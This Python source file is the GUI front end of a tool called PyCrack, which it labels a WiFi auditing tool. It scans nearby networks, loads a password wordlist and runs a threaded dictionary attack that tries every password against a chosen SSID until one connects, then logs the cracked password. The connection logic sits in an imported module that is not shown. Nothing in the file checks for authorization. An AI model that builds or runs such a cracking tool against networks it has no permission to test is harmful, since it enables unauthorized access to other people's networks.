import customtkinter as ctk
import threading
from tkinter import filedialog
from .wifi_manager import WifiManager
from .utils import setup_logger, load_wordlist

ctk.set_appearance_mode("Dark")
ctk.set_default_color_theme("green")

class PyCrackApp(ctk.CTk):
    def __init__(self):
        super().__init__()

        self.title("PyCrack - WiFi Auditing Tool")
        self.geometry("800x600")

        self.logger = setup_logger()
        self.wifi_manager = WifiManager(self.logger)
        self.wordlist = []
        self.selected_ssid = None
        self.is_attacking = False
        self.user_stopped = False

        self.create_widgets()
        self.scan_networks()

    def create_widgets(self):
        # Layout configuration
        self.grid_columnconfigure(1, weight=1)
        self.grid_rowconfigure(0, weight=1)

        # Sidebar
        self.sidebar_frame = ctk.CTkFrame(self, width=200, corner_radius=0)
        self.sidebar_frame.grid(row=0, column=0, sticky="nsew")
        self.sidebar_frame.grid_rowconfigure(4, weight=1)

        self.logo_label = ctk.CTkLabel(self.sidebar_frame, text="PyCrack", font=ctk.CTkFont(size=20, weight="bold"))
        self.logo_label.grid(row=0, column=0, padx=20, pady=(20, 10))

        self.scan_button = ctk.CTkButton(self.sidebar_frame, text="Scan Networks", command=self.scan_networks)
        self.scan_button.grid(row=1, column=0, padx=20, pady=10)

        self.load_wordlist_button = ctk.CTkButton(self.sidebar_frame, text="Load Wordlist", command=self.load_wordlist_file)
        self.load_wordlist_button.grid(row=2, column=0, padx=20, pady=10)

        self.attack_button = ctk.CTkButton(self.sidebar_frame, text="Start Attack", fg_color="red", hover_color="darkred", command=self.start_attack_thread)
        self.attack_button.grid(row=3, column=0, padx=20, pady=10)
        self.attack_button.configure(state="disabled")

        # Main Content Area
        self.main_frame = ctk.CTkFrame(self, corner_radius=0)
        self.main_frame.grid(row=0, column=1, sticky="nsew", padx=20, pady=20)
        self.main_frame.grid_rowconfigure(1, weight=1)
        self.main_frame.grid_columnconfigure(0, weight=1)

        self.network_label = ctk.CTkLabel(self.main_frame, text="Available Networks", font=ctk.CTkFont(size=16))
        self.network_label.grid(row=0, column=0, padx=10, pady=(10, 0), sticky="w")

        # Network List (Scrollable)
        self.network_scroll = ctk.CTkScrollableFrame(self.main_frame, label_text="Select a Network")
        self.network_scroll.grid(row=1, column=0, padx=10, pady=10, sticky="nsew")

        # Log Console
        self.log_textbox = ctk.CTkTextbox(self.main_frame, height=150)
        self.log_textbox.grid(row=2, column=0, padx=10, pady=10, sticky="ew")
        self.log_textbox.insert("0.0", "Welcome to PyCrack. Scan for networks to begin.\n")

    def log(self, message):
        self.log_textbox.insert("end", message + "\n")
        self.log_textbox.see("end")

    def scan_networks(self):
        self.log("Scanning for networks...")
        # Clear existing buttons
        for widget in self.network_scroll.winfo_children():
            widget.destroy()

        networks = self.wifi_manager.scan_networks()
        for net in networks:
            btn = ctk.CTkButton(self.network_scroll, text=f"{net.ssid} (Signal: {net.signal})", 
                                command=lambda s=net.ssid: self.select_network(s))
            btn.pack(fill="x", padx=5, pady=2)
        
        self.log(f"Found {len(networks)} networks.")

    def select_network(self, ssid):
        self.selected_ssid = ssid
        self.log(f"Selected Network: {ssid}")
        self.check_ready_to_attack()

    def load_wordlist_file(self):
        filename = filedialog.askopenfilename(title="Select Wordlist", filetypes=(("Text Files", "*.txt"), ("All Files", "*.*")))
        if filename:
            self.wordlist = load_wordlist(filename)
            self.log(f"Loaded {len(self.wordlist)} passwords from {filename}")
            self.check_ready_to_attack()

    def check_ready_to_attack(self):
        if self.selected_ssid and self.wordlist:
            self.attack_button.configure(state="normal")
        else:
            self.attack_button.configure(state="disabled")

    def start_attack_thread(self):
        if not self.is_attacking:
            self.is_attacking = True
            self.user_stopped = False
            self.attack_button.configure(text="Stop Attack", command=self.request_stop_attack)
            threading.Thread(target=self.run_attack, daemon=True).start()

    def request_stop_attack(self):
        self.user_stopped = True
        self.is_attacking = False
        self.log("Stopping attack...")

    def run_attack(self):
        self.log(f"Starting attack on {self.selected_ssid}...")
        self.log("Disconnecting and backing up saved profile to avoid false positives...")
        found_password = None
        try:
            self.wifi_manager.prepare_for_attack(self.selected_ssid)
            for password in self.wordlist:
                if not self.is_attacking:
                    break

                self.log(f"Trying password: {password}")
                success = self.wifi_manager.connect_to_network(self.selected_ssid, password)

                if success:
                    found_password = password
                    self.log(f"SUCCESS! Password found: {password}")
                    break

            if self.is_attacking and not found_password:
                self.log("Attack finished. Password not found in wordlist.")
        finally:
            self.is_attacking = False
            self.attack_button.configure(text="Start Attack", command=self.start_attack_thread)
            self.wifi_manager.cleanup_after_attack(password_found=found_password)
            if self.user_stopped and not found_password:
                self.log("Attack stopped by user.")
